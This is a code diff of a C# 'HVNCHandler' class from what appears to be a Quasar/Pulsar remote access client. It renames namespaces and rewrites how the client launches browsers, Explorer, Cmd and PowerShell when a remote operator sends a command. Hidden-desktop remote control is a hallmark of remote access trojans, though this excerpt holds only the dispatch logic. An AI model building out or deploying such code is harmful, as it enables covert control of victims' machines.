@@ -1,22 +1,21 @@
 ﻿using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
-using Pulsar.Client.Helper;
-using Pulsar.Client.Helper.HVNC;
-using Pulsar.Common.Enums;
-using Pulsar.Common.Messages;
-using Pulsar.Common.Messages.Monitoring.HVNC;
-using Pulsar.Common.Messages.other;
-using Pulsar.Common.Networking;
-using Pulsar.Common.Video;
-using Pulsar.Common.Video.Codecs;
+using Quasar.Client.Helper;
+using Quasar.Client.Helper.HVNC;
+using Quasar.Common.Enums;
+using Quasar.Common.Messages;
+using Quasar.Common.Messages.Monitoring.HVNC;
+using Quasar.Common.Messages.other;
+using Quasar.Common.Networking;
+using Quasar.Common.Video;
+using Quasar.Common.Video.Codecs;
 
-namespace Pulsar.Client.Messages
+namespace Quasar.Client.Messages
 {
     public class HVNCHandler : IMessageProcessor, IDisposable
     {
@@ -266,27 +265,46 @@ namespace Pulsar.Client.Messages
         private void Execute(ISender client, StartHVNCProcess message)
         {
             string name = message.Application;
-            var processActions = new Dictionary<string, Action>
+            if (name == "Chrome")
             {
-                { "Chrome", ProcessHandler.Startchrome },
-                { "Explorer", ProcessHandler.StartExplorer },
-                { "Cmd", ProcessHandler.StartCmd },
-                { "Powershell", ProcessHandler.StartPowershell },
-                { "Edge", ProcessHandler.StartEdge },
-                { "Brave", ProcessHandler.StartBrave },
-                { "Opera", ProcessHandler.StartOpera },
-                { "Mozilla", ProcessHandler.StartFirefox },
-                { "Discord", ProcessHandler.StartDiscord }
-            };
-
-            if (processActions.TryGetValue(name, out var action))
-            {
-                action();
+                this.ProcessHandler.Startchrome();
+                return;
             }
-            else
+            if (name == "Explorer")
             {
-                ProcessHandler.StartGeneric(name);
+                this.ProcessHandler.StartExplorer();
+                return;
             }
+            if (name == "Cmd")
+            {
+                this.ProcessHandler.StartCmd();
+                return;
+            }
+            if (name == "Powershell")
+            {
+                this.ProcessHandler.StartPowershell();
+                return;
+            }
+            if (name == "Edge")
+            {
+                this.ProcessHandler.StartEdge();
+                return;
+            }
+            if (name == "Brave")
+            {
+                this.ProcessHandler.StartBrave();
+                return;
+            }
+            if (name == "Opera")
+            {
+                this.ProcessHandler.StartOpera();
+                return;
+            }
+            if (!(name == "Mozilla"))
+            {
+                return;
+            }
+            this.ProcessHandler.StartFirefox();
         }
 
         public void Dispose()
